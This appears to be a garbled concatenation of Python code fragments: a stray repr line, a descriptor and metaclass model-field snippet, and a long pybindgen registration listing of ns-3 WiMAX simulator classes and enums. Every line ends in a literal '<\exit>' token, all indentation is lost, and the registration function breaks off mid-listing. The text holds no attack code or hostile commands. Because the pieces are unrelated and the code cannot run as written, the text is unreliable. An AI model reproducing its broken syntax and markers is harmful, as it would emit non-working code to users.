return "%s(features=%s, classifier=%s)" % (self.__class__.__name__, feature_repr, classifier_repr)<\exit>
import six<\exit>
class NaiveModelField(object):<\exit>
def __init__(self, name):<\exit>
self.name = name<\exit>
self.internal_name = '_' + self.name<\exit>
def __get__(self, instance, instance_type):<\exit>
if instance is None: return self<\exit>
return getattr(instance, self.internal_name, '')<\exit>
def __set__(self, instance, value):<\exit>
setattr(instance, self.internal_name, value)<\exit>
class ModelField(object):<\exit>
def __init__(self):<\exit>
self.name = None<\exit>
self.internal_name = None<\exit>
def __get__(self, instance, instance_type):<\exit>
if instance is None: return self<\exit>
return getattr(instance, self.internal_name, '')<\exit>
def __set__(self, instance, value):<\exit>
setattr(instance, self.internal_name, value)<\exit>
class ModelBaseMeta(type):<\exit>
def __new__(mcs, name, bases, class_dict):<\exit>
for key, value in class_dict.items():<\exit>
if isinstance(value, ModelField):<\exit>
value.name = key<\exit>
value.internal_name = '_' + key<\exit>
cls = type.__new__(mcs, name, bases, class_dict)<\exit>
return cls<\exit>
class Model(six.with_metaclass(ModelBaseMeta)):<\exit>
pass<\exit>
from django.db import models<\exit>
def post_register_types(root_module):<\exit>
root_module.add_include('"ns3/propagation-module.h"')<\exit>
from pybindgen import Module, FileCodeSink, param, retval, cppclass, typehandlers<\exit>
import pybindgen.settings<\exit>
import warnings<\exit>
class ErrorHandler(pybindgen.settings.ErrorHandler):<\exit>
def handle_error(self, wrapper, exception, traceback_):<\exit>
warnings.warn("exception %r in wrapper %s" % (exception, wrapper))<\exit>
return True<\exit>
pybindgen.settings.error_handler = ErrorHandler()<\exit>
import sys<\exit>
def module_init():<\exit>
root_module = Module('ns.wimax', cpp_namespace='::ns3')<\exit>
return root_module<\exit>
def register_types(module):<\exit>
root_module = module.get_root()<\exit>
module.add_enum('ReqType', ['DATA', 'UNICAST_POLLING'])<\exit>
module.add_enum('LogLevel', ['LOG_NONE', 'LOG_ERROR', 'LOG_LEVEL_ERROR', 'LOG_WARN', 'LOG_LEVEL_WARN', 'LOG_DEBUG', 'LOG_LEVEL_DEBUG', 'LOG_INFO', 'LOG_LEVEL_INFO', 'LOG_FUNCTION', 'LOG_LEVEL_FUNCTION', 'LOG_LOGIC', 'LOG_LEVEL_LOGIC', 'LOG_ALL', 'LOG_LEVEL_ALL', 'LOG_PREFIX_FUNC', 'LOG_PREFIX_TIME', 'LOG_PREFIX_NODE'], import_from_module='ns.core')<\exit>
module.add_class('Address', import_from_module='ns.network')<\exit>
module.add_enum('MaxSize_e', ['MAX_SIZE'], outer_class=root_module['ns3::Address'], import_from_module='ns.network')<\exit>
module.add_class('AsciiTraceHelper', import_from_module='ns.network')<\exit>
module.add_class('AsciiTraceHelperForDevice', allow_subclassing=True, import_from_module='ns.network')<\exit>
module.add_class('AttributeConstructionList', import_from_module='ns.core')<\exit>
module.add_class('Item', import_from_module='ns.core', outer_class=root_module['ns3::AttributeConstructionList'])<\exit>
module.add_class('Buffer', import_from_module='ns.network')<\exit>
module.add_class('Iterator', import_from_module='ns.network', outer_class=root_module['ns3::Buffer'])<\exit>
module.add_class('ByteTagIterator', import_from_module='ns.network')<\exit>
module.add_class('Item', import_from_module='ns.network', outer_class=root_module['ns3::ByteTagIterator'])<\exit>
module.add_class('ByteTagList', import_from_module='ns.network')<\exit>
module.add_class('Iterator', import_from_module='ns.network', outer_class=root_module['ns3::ByteTagList'])<\exit>
module.add_class('Item', import_from_module='ns.network', outer_class=root_module['ns3::ByteTagList::Iterator'])<\exit>
module.add_class('CallbackBase', import_from_module='ns.core')<\exit>
module.add_class('Cid')<\exit>
module.add_enum('Type', ['BROADCAST', 'INITIAL_RANGING', 'BASIC', 'PRIMARY', 'TRANSPORT', 'MULTICAST', 'PADDING'], outer_class=root_module['ns3::Cid'])<\exit>
module.add_class('CidFactory')<\exit>
module.add_class('CsParameters')<\exit>
module.add_enum('Action', ['ADD', 'REPLACE', 'DELETE'], outer_class=root_module['ns3::CsParameters'])<\exit>
module.add_class('DcdChannelEncodings', allow_subclassing=True)<\exit>
module.add_class('DlFramePrefixIe')<\exit>
module.add_class('EventId', import_from_module='ns.core')<\exit>
module.add_class('IpcsClassifierRecord')<\exit>
module.add_class('Ipv4Address', import_from_module='ns.network')<\exit>
root_module['ns3::Ipv4Address'].implicitly_converts_to(root_module['ns3::Address'])<\exit>
module.add_class('Ipv4Mask', import_from_module='ns.network')<\exit>
module.add_class('Ipv6Address', import_from_module='ns.network')<\exit>
root_module['ns3::Ipv6Address'].implicitly_converts_to(root_module['ns3::Address'])<\exit>
module.add_class('Ipv6Prefix', import_from_module='ns.network')<\exit>
module.add_class('LogComponent', import_from_module='ns.core')<\exit>
module.add_class('Mac48Address', import_from_module='ns.network')<\exit>
root_module['ns3::Mac48Address'].implicitly_converts_to(root_module['ns3::Address'])<\exit>
module.add_class('NetDeviceContainer', import_from_module='ns.network')<\exit>
module.add_class('NodeContainer', import_from_module='ns.network')<\exit>
module.add_class('ObjectBase', allow_subclassing=True, import_from_module='ns.core')<\exit>
module.add_class('ObjectDeleter', import_from_module='ns.core')<\exit>
module.add_class('ObjectFactory', import_from_module='ns.core')<\exit>
module.add_class('OfdmDcdChannelEncodings', parent=root_module['ns3::DcdChannelEncodings'])<\exit>
module.add_class('OfdmDlBurstProfile')<\exit>
module.add_enum('Diuc', ['DIUC_STC_ZONE', 'DIUC_BURST_PROFILE_1', 'DIUC_BURST_PROFILE_2', 'DIUC_BURST_PROFILE_3', 'DIUC_BURST_PROFILE_4', 'DIUC_BURST_PROFILE_5', 'DIUC_BURST_PROFILE_6', 'DIUC_BURST_PROFILE_7', 'DIUC_BURST_PROFILE_8', 'DIUC_BURST_PROFILE_9', 'DIUC_BURST_PROFILE_10', 'DIUC_BURST_PROFILE_11', 'DIUC_GAP', 'DIUC_END_OF_MAP'], outer_class=root_module['ns3::OfdmDlBurstProfile'])<\exit>
module.add_class('OfdmDlMapIe')<\exit>
module.add_class('OfdmUlBurstProfile')<\exit>
module.add_enum('Uiuc', ['UIUC_INITIAL_RANGING', 'UIUC_REQ_REGION_FULL', 'UIUC_REQ_REGION_FOCUSED', 'UIUC_FOCUSED_CONTENTION_IE', 'UIUC_BURST_PROFILE_5', 'UIUC_BURST_PROFILE_6', 'UIUC_BURST_PROFILE_7', 'UIUC_BURST_PROFILE_8', 'UIUC_BURST_PROFILE_9', 'UIUC_BURST_PROFILE_10', 'UIUC_BURST_PROFILE_11', 'UIUC_BURST_PROFILE_12', 'UIUC_SUBCH_NETWORK_ENTRY', 'UIUC_END_OF_MAP'], outer_class=root_module['ns3::OfdmUlBurstProfile'])<\exit>
module.add_class('OfdmUlMapIe')<\exit>
module.add_class('PacketMetadata', import_from_module='ns.network')<\exit>
module.add_class('Item', import_from_module='ns.network', outer_class=root_module['ns3::PacketMetadata'])<\exit>
module.add_enum('', ['PAYLOAD', 'HEADER', 'TRAILER'], outer_class=root_module['ns3::PacketMetadata::Item'], import_from_module='ns.network')<\exit>
module.add_class('ItemIterator', import_from_module='ns.network', outer_class=root_module['ns3::PacketMetadata'])<\exit>
module.add_class('PacketTagIterator', import_from_module='ns.network')<\exit>
module.add_class('Item', import_from_module='ns.network', outer_class=root_module['ns3::PacketTagIterator'])<\exit>
module.add_class('PacketTagList', import_from_module='ns.network')<\exit>
module.add_class('TagData', import_from_module='ns.network', outer_class=root_module['ns3::PacketTagList'])<\exit>
module.add_class('PcapFile', import_from_module='ns.network')<\exit>
module.add_class('PcapHelper', import_from_module='ns.network')<\exit>
module.add_enum('', ['DLT_NULL', 'DLT_EN10MB', 'DLT_PPP', 'DLT_RAW', 'DLT_IEEE802_11', 'DLT_PRISM_HEADER', 'DLT_IEEE802_11_RADIO'], outer_class=root_module['ns3::PcapHelper'], import_from_module='ns.network')<\exit>
module.add_class('PcapHelperForDevice', allow_subclassing=True, import_from_module='ns.network')<\exit>
module.add_class('RandomVariable', import_from_module='ns.core')<\exit>
module.add_class('SNRToBlockErrorRateManager')<\exit>
module.add_class('SNRToBlockErrorRateRecord')<\exit>
module.add_class('SSRecord')<\exit>
module.add_class('SeedManager', import_from_module='ns.core')<\exit>
module.add_class('SendParams')<\exit>
module.add_class('SequentialVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('ServiceFlow')<\exit>
module.add_enum('Direction', ['SF_DIRECTION_DOWN', 'SF_DIRECTION_UP'], outer_class=root_module['ns3::ServiceFlow'])<\exit>
module.add_enum('Type', ['SF_TYPE_PROVISIONED', 'SF_TYPE_ADMITTED', 'SF_TYPE_ACTIVE'], outer_class=root_module['ns3::ServiceFlow'])<\exit>
module.add_enum('SchedulingType', ['SF_TYPE_NONE', 'SF_TYPE_UNDEF', 'SF_TYPE_BE', 'SF_TYPE_NRTPS', 'SF_TYPE_RTPS', 'SF_TYPE_UGS', 'SF_TYPE_ALL'], outer_class=root_module['ns3::ServiceFlow'])<\exit>
module.add_enum('CsSpecification', ['ATM', 'IPV4', 'IPV6', 'ETHERNET', 'VLAN', 'IPV4_OVER_ETHERNET', 'IPV6_OVER_ETHERNET', 'IPV4_OVER_VLAN', 'IPV6_OVER_VLAN'], outer_class=root_module['ns3::ServiceFlow'])<\exit>
module.add_enum('ModulationType', ['MODULATION_TYPE_BPSK_12', 'MODULATION_TYPE_QPSK_12', 'MODULATION_TYPE_QPSK_34', 'MODULATION_TYPE_QAM16_12', 'MODULATION_TYPE_QAM16_34', 'MODULATION_TYPE_QAM64_23', 'MODULATION_TYPE_QAM64_34'], outer_class=root_module['ns3::ServiceFlow'])<\exit>
module.add_class('ServiceFlowRecord')<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::Object', 'ns3::ObjectBase', 'ns3::ObjectDeleter'], parent=root_module['ns3::ObjectBase'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('Simulator', destructor_visibility='private', import_from_module='ns.core')<\exit>
module.add_class('Tag', import_from_module='ns.network', parent=root_module['ns3::ObjectBase'])<\exit>
module.add_class('TagBuffer', import_from_module='ns.network')<\exit>
module.add_class('TlvValue', allow_subclassing=True)<\exit>
module.add_class('TosTlvValue', parent=root_module['ns3::TlvValue'])<\exit>
module.add_class('TriangularVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('TypeId', import_from_module='ns.core')<\exit>
module.add_enum('AttributeFlag', ['ATTR_GET', 'ATTR_SET', 'ATTR_CONSTRUCT', 'ATTR_SGC'], outer_class=root_module['ns3::TypeId'], import_from_module='ns.core')<\exit>
module.add_class('AttributeInformation', import_from_module='ns.core', outer_class=root_module['ns3::TypeId'])<\exit>
module.add_class('TraceSourceInformation', import_from_module='ns.core', outer_class=root_module['ns3::TypeId'])<\exit>
module.add_class('U16TlvValue', parent=root_module['ns3::TlvValue'])<\exit>
module.add_class('U32TlvValue', parent=root_module['ns3::TlvValue'])<\exit>
module.add_class('U8TlvValue', parent=root_module['ns3::TlvValue'])<\exit>
module.add_class('UcdChannelEncodings', allow_subclassing=True)<\exit>
module.add_class('UniformVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('VectorTlvValue', parent=root_module['ns3::TlvValue'])<\exit>
module.add_class('WeibullVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('WimaxHelper', parent=[root_module['ns3::PcapHelperForDevice'], root_module['ns3::AsciiTraceHelperForDevice']])<\exit>
module.add_enum('NetDeviceType', ['DEVICE_TYPE_SUBSCRIBER_STATION', 'DEVICE_TYPE_BASE_STATION'], outer_class=root_module['ns3::WimaxHelper'])<\exit>
module.add_enum('PhyType', ['SIMPLE_PHY_TYPE_OFDM'], outer_class=root_module['ns3::WimaxHelper'])<\exit>
module.add_enum('SchedulerType', ['SCHED_TYPE_SIMPLE', 'SCHED_TYPE_RTPS', 'SCHED_TYPE_MBQOS'], outer_class=root_module['ns3::WimaxHelper'])<\exit>
module.add_class('ZetaVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('ZipfVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('empty', import_from_module='ns.core')<\exit>
module.add_class('int64x64_t', import_from_module='ns.core')<\exit>
module.add_class('simpleOfdmSendParam')<\exit>
module.add_class('Chunk', import_from_module='ns.network', parent=root_module['ns3::ObjectBase'])<\exit>
module.add_class('ClassificationRuleVectorTlvValue', parent=root_module['ns3::VectorTlvValue'])<\exit>
module.add_enum('ClassificationRuleTlvType', ['Priority', 'ToS', 'Protocol', 'IP_src', 'IP_dst', 'Port_src', 'Port_dst', 'Index'], outer_class=root_module['ns3::ClassificationRuleVectorTlvValue'])<\exit>
module.add_class('ConstantVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('CsParamVectorTlvValue', parent=root_module['ns3::VectorTlvValue'])<\exit>
module.add_enum('Type', ['Classifier_DSC_Action', 'Packet_Classification_Rule'], outer_class=root_module['ns3::CsParamVectorTlvValue'])<\exit>
module.add_class('DeterministicVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('EmpiricalVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('ErlangVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('ExponentialVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('GammaVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('Header', import_from_module='ns.network', parent=root_module['ns3::Chunk'])<\exit>
module.add_class('IntEmpiricalVariable', import_from_module='ns.core', parent=root_module['ns3::EmpiricalVariable'])<\exit>
module.add_class('Ipv4AddressTlvValue', parent=root_module['ns3::TlvValue'])<\exit>
module.add_class('ipv4Addr', outer_class=root_module['ns3::Ipv4AddressTlvValue'])<\exit>
module.add_class('LogNormalVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('MacHeaderType', parent=root_module['ns3::Header'])<\exit>
module.add_enum('HeaderType', ['HEADER_TYPE_GENERIC', 'HEADER_TYPE_BANDWIDTH'], outer_class=root_module['ns3::MacHeaderType'])<\exit>
module.add_class('ManagementMessageType', parent=root_module['ns3::Header'])<\exit>
module.add_enum('MessageType', ['MESSAGE_TYPE_UCD', 'MESSAGE_TYPE_DCD', 'MESSAGE_TYPE_DL_MAP', 'MESSAGE_TYPE_UL_MAP', 'MESSAGE_TYPE_RNG_REQ', 'MESSAGE_TYPE_RNG_RSP', 'MESSAGE_TYPE_REG_REQ', 'MESSAGE_TYPE_REG_RSP', 'MESSAGE_TYPE_DSA_REQ', 'MESSAGE_TYPE_DSA_RSP', 'MESSAGE_TYPE_DSA_ACK'], outer_class=root_module['ns3::ManagementMessageType'])<\exit>
module.add_class('NormalVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('Object', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::Object, ns3::ObjectBase, ns3::ObjectDeleter >'])<\exit>
module.add_class('AggregateIterator', import_from_module='ns.core', outer_class=root_module['ns3::Object'])<\exit>
module.add_class('OfdmDownlinkFramePrefix', parent=root_module['ns3::Header'])<\exit>
module.add_class('OfdmSendParams', parent=root_module['ns3::SendParams'])<\exit>
module.add_class('OfdmUcdChannelEncodings', parent=root_module['ns3::UcdChannelEncodings'])<\exit>
module.add_class('PacketBurst', import_from_module='ns.network', parent=root_module['ns3::Object'])<\exit>
module.add_class('ParetoVariable', import_from_module='ns.core', parent=root_module['ns3::RandomVariable'])<\exit>
module.add_class('PcapFileWrapper', import_from_module='ns.network', parent=root_module['ns3::Object'])<\exit>
module.add_class('PortRangeTlvValue', parent=root_module['ns3::TlvValue'])<\exit>
module.add_class('PortRange', outer_class=root_module['ns3::PortRangeTlvValue'])<\exit>
module.add_class('PriorityUlJob', parent=root_module['ns3::Object'])<\exit>
module.add_class('PropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::Object'])<\exit>
module.add_class('ProtocolTlvValue', parent=root_module['ns3::TlvValue'])<\exit>
module.add_class('RandomPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])<\exit>
module.add_class('RangePropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])<\exit>
module.add_class('RngReq', parent=root_module['ns3::Header'])<\exit>
module.add_class('RngRsp', parent=root_module['ns3::Header'])<\exit>
module.add_class('SSManager', parent=root_module['ns3::Object'])<\exit>
module.add_class('ServiceFlowManager', parent=root_module['ns3::Object'])<\exit>
module.add_enum('ConfirmationCode', ['CONFIRMATION_CODE_SUCCESS', 'CONFIRMATION_CODE_REJECT'], outer_class=root_module['ns3::ServiceFlowManager'])<\exit>
module.add_class('SfVectorTlvValue', parent=root_module['ns3::VectorTlvValue'])<\exit>
module.add_enum('Type', ['SFID', 'CID', 'Service_Class_Name', 'reserved1', 'QoS_Parameter_Set_Type', 'Traffic_Priority', 'Maximum_Sustained_Traffic_Rate', 'Maximum_Traffic_Burst', 'Minimum_Reserved_Traffic_Rate', 'Minimum_Tolerable_Traffic_Rate', 'Service_Flow_Scheduling_Type', 'Request_Transmission_Policy', 'Tolerated_Jitter', 'Maximum_Latency', 'Fixed_length_versus_Variable_length_SDU_Indicator', 'SDU_Size', 'Target_SAID', 'ARQ_Enable', 'ARQ_WINDOW_SIZE', 'ARQ_RETRY_TIMEOUT_Transmitter_Delay', 'ARQ_RETRY_TIMEOUT_Receiver_Delay', 'ARQ_BLOCK_LIFETIME', 'ARQ_SYNC_LOSS', 'ARQ_DELIVER_IN_ORDER', 'ARQ_PURGE_TIMEOUT', 'ARQ_BLOCK_SIZE', 'reserved2', 'CS_Specification', 'IPV4_CS_Parameters'], outer_class=root_module['ns3::SfVectorTlvValue'])<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::AttributeAccessor', 'ns3::empty', 'ns3::DefaultDeleter<ns3::AttributeAccessor>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::AttributeChecker', 'ns3::empty', 'ns3::DefaultDeleter<ns3::AttributeChecker>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::AttributeValue', 'ns3::empty', 'ns3::DefaultDeleter<ns3::AttributeValue>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::CallbackImplBase', 'ns3::empty', 'ns3::DefaultDeleter<ns3::CallbackImplBase>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::EventImpl', 'ns3::empty', 'ns3::DefaultDeleter<ns3::EventImpl>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::NixVector', 'ns3::empty', 'ns3::DefaultDeleter<ns3::NixVector>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::OutputStreamWrapper', 'ns3::empty', 'ns3::DefaultDeleter<ns3::OutputStreamWrapper>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::Packet', 'ns3::empty', 'ns3::DefaultDeleter<ns3::Packet>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('SimpleRefCount', automatic_type_narrowing=True, import_from_module='ns.core', template_parameters=['ns3::TraceSourceAccessor', 'ns3::empty', 'ns3::DefaultDeleter<ns3::TraceSourceAccessor>'], parent=root_module['ns3::empty'], memory_policy=cppclass.ReferenceCountingMethodsPolicy(incref_method='Ref', decref_method='Unref', peekref_method='GetReferenceCount'))<\exit>
module.add_class('SsServiceFlowManager', parent=root_module['ns3::ServiceFlowManager'])<\exit>
module.add_enum('ConfirmationCode', ['CONFIRMATION_CODE_SUCCESS', 'CONFIRMATION_CODE_REJECT'], outer_class=root_module['ns3::SsServiceFlowManager'])<\exit>
module.add_class('ThreeLogDistancePropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])<\exit>
module.add_class('Time', import_from_module='ns.core')<\exit>
module.add_enum('Unit', ['S', 'MS', 'US', 'NS', 'PS', 'FS', 'LAST'], outer_class=root_module['ns3::Time'], import_from_module='ns.core')<\exit>
root_module['ns3::Time'].implicitly_converts_to(root_module['ns3::int64x64_t'])<\exit>
module.add_class('Tlv', parent=root_module['ns3::Header'])<\exit>
module.add_enum('CommonTypes', ['HMAC_TUPLE', 'MAC_VERSION_ENCODING', 'CURRENT_TRANSMIT_POWER', 'DOWNLINK_SERVICE_FLOW', 'UPLINK_SERVICE_FLOW', 'VENDOR_ID_EMCODING', 'VENDOR_SPECIFIC_INFORMATION'], outer_class=root_module['ns3::Tlv'])<\exit>
module.add_class('TraceSourceAccessor', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::TraceSourceAccessor, ns3::empty, ns3::DefaultDeleter<ns3::TraceSourceAccessor> >'])<\exit>
module.add_class('Trailer', import_from_module='ns.network', parent=root_module['ns3::Chunk'])<\exit>
module.add_class('TwoRayGroundPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])<\exit>
module.add_class('Ucd', parent=root_module['ns3::Header'])<\exit>
module.add_class('UlJob', parent=root_module['ns3::Object'])<\exit>
module.add_enum('JobPriority', ['LOW', 'INTERMEDIATE', 'HIGH'], outer_class=root_module['ns3::UlJob'])<\exit>
module.add_class('UlMap', parent=root_module['ns3::Header'])<\exit>
module.add_class('UplinkScheduler', parent=root_module['ns3::Object'])<\exit>
module.add_class('UplinkSchedulerMBQoS', parent=root_module['ns3::UplinkScheduler'])<\exit>
module.add_class('UplinkSchedulerRtps', parent=root_module['ns3::UplinkScheduler'])<\exit>
module.add_class('UplinkSchedulerSimple', parent=root_module['ns3::UplinkScheduler'])<\exit>
module.add_class('WimaxConnection', parent=root_module['ns3::Object'])<\exit>
module.add_class('WimaxMacQueue', parent=root_module['ns3::Object'])<\exit>
module.add_class('WimaxMacToMacHeader', parent=root_module['ns3::Header'])<\exit>
module.add_class('WimaxPhy', parent=root_module['ns3::Object'])<\exit>
module.add_enum('ModulationType', ['MODULATION_TYPE_BPSK_12', 'MODULATION_TYPE_QPSK_12', 'MODULATION_TYPE_QPSK_34', 'MODULATION_TYPE_QAM16_12', 'MODULATION_TYPE_QAM16_34', 'MODULATION_TYPE_QAM64_23', 'MODULATION_TYPE_QAM64_34'], outer_class=root_module['ns3::WimaxPhy'])<\exit>
module.add_enum('PhyState', ['PHY_STATE_IDLE', 'PHY_STATE_SCANNING', 'PHY_STATE_TX', 'PHY_STATE_RX'], outer_class=root_module['ns3::WimaxPhy'])<\exit>
module.add_enum('PhyType', ['SimpleWimaxPhy', 'simpleOfdmWimaxPhy'], outer_class=root_module['ns3::WimaxPhy'])<\exit>
module.add_class('AttributeAccessor', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::AttributeAccessor, ns3::empty, ns3::DefaultDeleter<ns3::AttributeAccessor> >'])<\exit>
module.add_class('AttributeChecker', allow_subclassing=False, automatic_type_narrowing=True, import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::AttributeChecker, ns3::empty, ns3::DefaultDeleter<ns3::AttributeChecker> >'])<\exit>
module.add_class('AttributeValue', allow_subclassing=False, automatic_type_narrowing=True, import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::AttributeValue, ns3::empty, ns3::DefaultDeleter<ns3::AttributeValue> >'])<\exit>
module.add_class('BSScheduler', parent=root_module['ns3::Object'])<\exit>
module.add_class('BSSchedulerRtps', parent=root_module['ns3::BSScheduler'])<\exit>
module.add_class('BSSchedulerSimple', parent=root_module['ns3::BSScheduler'])<\exit>
module.add_class('BandwidthRequestHeader', parent=root_module['ns3::Header'])<\exit>
module.add_enum('HeaderType', ['HEADER_TYPE_INCREMENTAL', 'HEADER_TYPE_AGGREGATE'], outer_class=root_module['ns3::BandwidthRequestHeader'])<\exit>
module.add_class('BsServiceFlowManager', parent=root_module['ns3::ServiceFlowManager'])<\exit>
module.add_enum('ConfirmationCode', ['CONFIRMATION_CODE_SUCCESS', 'CONFIRMATION_CODE_REJECT'], outer_class=root_module['ns3::BsServiceFlowManager'])<\exit>
module.add_class('CallbackChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('CallbackImplBase', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::CallbackImplBase, ns3::empty, ns3::DefaultDeleter<ns3::CallbackImplBase> >'])<\exit>
module.add_class('CallbackValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('Channel', import_from_module='ns.network', parent=root_module['ns3::Object'])<\exit>
module.add_class('ConnectionManager', parent=root_module['ns3::Object'])<\exit>
module.add_class('Dcd', parent=root_module['ns3::Header'])<\exit>
module.add_class('DlMap', parent=root_module['ns3::Header'])<\exit>
module.add_class('DsaAck', parent=root_module['ns3::Header'])<\exit>
module.add_class('DsaReq', parent=root_module['ns3::Header'])<\exit>
module.add_class('DsaRsp', parent=root_module['ns3::Header'])<\exit>
module.add_class('EmptyAttributeValue', import_from_module='ns.core', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('EventImpl', import_from_module='ns.core', parent=root_module['ns3::SimpleRefCount< ns3::EventImpl, ns3::empty, ns3::DefaultDeleter<ns3::EventImpl> >'])<\exit>
module.add_class('FixedRssLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])<\exit>
module.add_class('FragmentationSubheader', parent=root_module['ns3::Header'])<\exit>
module.add_class('FriisPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])<\exit>
module.add_class('GenericMacHeader', parent=root_module['ns3::Header'])<\exit>
module.add_class('GrantManagementSubheader', parent=root_module['ns3::Header'])<\exit>
module.add_class('IpcsClassifier', parent=root_module['ns3::Object'])<\exit>
module.add_class('Ipv4AddressChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('Ipv4AddressValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('Ipv4MaskChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('Ipv4MaskValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('Ipv6AddressChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('Ipv6AddressValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('Ipv6PrefixChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('Ipv6PrefixValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('LogDistancePropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])<\exit>
module.add_class('Mac48AddressChecker', import_from_module='ns.network', parent=root_module['ns3::AttributeChecker'])<\exit>
module.add_class('Mac48AddressValue', import_from_module='ns.network', parent=root_module['ns3::AttributeValue'])<\exit>
module.add_class('MatrixPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])<\exit>
module.add_class('NakagamiPropagationLossModel', import_from_module='ns.propagation', parent=root_module['ns3::PropagationLossModel'])<\exit>
module.add_class('NetDevice', import_from_module='ns.network', parent=root_module['ns3::Object'])<\exit>
module.add_enum('PacketType', ['PACKET_HOST', 'NS3_PACKET_HOST', 'PACKET_BROADCAST', 'NS3_PACKET_BROADCAST', 'PACKET_MULTICAST', 'NS3_PACKET_MULTICAST', 'PACKET_OTHERHOST', 'NS3_PACKET_OTHERHOST'], outer_class=root_module['ns3::NetDevice'], import_from_module='ns.network')<\exit>
module.add_class('NixVector', import_from_module='ns.network', parent=root_module['ns3::SimpleRefCount< ns3::NixVector, ns3::empty, ns3::DefaultDeleter<ns3::NixVector> >'])<\exit>
module.add_class('Node', import_from_module='ns.network', parent=root_module['ns3::Object'])<\exit>
module.add_class('ObjectFactoryChecker', import_from_module='ns.core', parent=root_module['ns3::AttributeChecker'])<\exit>
